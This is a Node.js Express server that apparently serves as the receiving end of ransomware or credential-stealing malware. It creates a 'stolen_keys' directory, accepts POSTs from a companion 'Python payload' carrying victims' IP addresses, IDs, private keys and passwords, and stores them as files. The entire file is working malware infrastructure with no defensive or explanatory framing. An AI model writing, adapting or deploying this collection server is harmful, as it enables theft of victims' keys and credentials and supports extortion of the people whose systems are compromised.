const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const KEYS_DIR = 'stolen_keys'; 
const PORT = 3000

app.use(express.json()); // Middleware to parse JSON-formatted request bodies
app.use(express.urlencoded({ extended: true }));

if (!fs.existsSync(KEYS_DIR)) {
    fs.mkdirSync(KEYS_DIR);
    console.log(`Directory '${KEYS_DIR}' has been created.`);
}

app.post('/password', (req, res) => {
    const victimIp = req.body.victim_ip; // Python payload: 'victim_ip'
    const victimId = req.body.victim_id; // python payload: 'victim_id'
    const privateKeyData = req.body.private_key_data; // Python payload: 'private_key_data'
    const Password = req.body.password; // Python payload: 'password'

    if (!victimIp || !privateKeyData) {
        console.error("Invalid request: IP address or private key data is missing.");
        return res.status(400).send({ result: false, message: 'Bad Request: Missing IP or private key data.' });
    }

    const keyFilename = path.join(KEYS_DIR, `${victimId}_${victimIp}_private_key.pem`);
    const infoFilename = path.join(KEYS_DIR, `${victimId}_${victimIp}_info.json`); // File to store information such as passwords

    fs.writeFile(keyFilename, privateKeyData, (err) => {
        if (err) {
            console.error(`Failed to save private key file '${keyFilename}':`, err);
            return res.status(500).send({ result: false, message: 'Failed to save private key.' });
        }
        console.log(`Private key file '${keyFilename}' saved successfully.`);
        // Save related information (IP address, password, etc.) to a separate JSON file
        const info = {
            victim_ip: victimIp,
            victim_Id: victimId,
            password: Password,
            timestamp: new Date().toISOString()
        };
        fs.writeFile(infoFilename, JSON.stringify(info, null, 2), (err) => {
            if (err) {
                console.error(`Failed to save info file '${infoFilename}':`, err);
                /* 
                The keys were saved successfully, so respond with 200,
                but you may also want to notify that logging the info file failed. 
                */
                return res.status(200).send({ result: true, message: 'Private key saved, but info log failed.' });
            }
            console.log(`Info file '${infoFilename}' saved successfully.`);
            res.status(200).send({ result: true, message: 'Private key and info saved successfully.' });
        });
    });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server is running on http://0.0.0.0:${PORT}`);
    console.log(`Private keys and related information are stored in the '${KEYS_DIR}' directory.`);
    console.log(`(For external access, you may need to open port ${PORT} in your firewall)`);
});